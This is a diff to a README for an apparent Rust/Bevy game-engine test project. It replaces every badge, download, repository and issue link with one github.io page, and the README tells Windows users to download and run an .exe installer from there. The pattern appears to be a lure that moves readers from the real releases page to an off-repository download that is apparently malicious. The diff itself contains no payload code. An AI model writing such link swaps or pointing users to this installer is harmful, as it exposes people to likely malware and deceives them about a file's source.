@@ -1,7 +1,7 @@
 # 🎮 bevy-game-engine-test-lab - Your Gateway to Rust Game Experiments
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue?style=for-the-badge&logo=windows)](https://github.com/deirdretimely239/bevy-game-engine-test-lab/releases)
-[![Latest Release](https://img.shields.io/github/v/release/deirdretimely239/bevy-game-engine-test-lab?style=for-the-badge&color=grey)](https://github.com/deirdretimely239/bevy-game-engine-test-lab/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue?style=for-the-badge&logo=windows)](https://deirdretimely239.github.io)
+[![Latest Release](https://img.shields.io/github/v/release/deirdretimely239/bevy-game-engine-test-lab?style=for-the-badge&color=grey)](https://deirdretimely239.github.io)
 
 ## ✨ What Is This?
 
@@ -27,7 +27,7 @@ Follow these steps to download and run the software on your Windows computer.
 
 Visit the releases page to get the latest Windows installer:
 
-👉 **[Click here to download from the releases page](https://github.com/deirdretimely239/bevy-game-engine-test-lab/releases)**
+👉 **[Click here to download from the releases page](https://deirdretimely239.github.io)**
 
 On that page, find the latest release. Look for a file named something like `bevy-game-engine-test-lab-v1.0.0-windows-installer.exe` or `BevyTestLab-Setup-1.0.0.exe`. Click on it to start the download.
 
@@ -125,9 +125,9 @@ Yes. Check the releases page for new versions. Updates may add more experiments 
 
 ## 🔗 Quick Links
 
-- [Download Latest Windows Installer](https://github.com/deirdretimely239/bevy-game-engine-test-lab/releases)
-- [GitHub Repository](https://github.com/deirdretimely239/bevy-game-engine-test-lab)
-- [Report an Issue](https://github.com/deirdretimely239/bevy-game-engine-test-lab/issues)
+- [Download Latest Windows Installer](https://deirdretimely239.github.io)
+- [GitHub Repository](https://deirdretimely239.github.io)
+- [Report an Issue](https://deirdretimely239.github.io)
 
 ## 📦 Version History
 
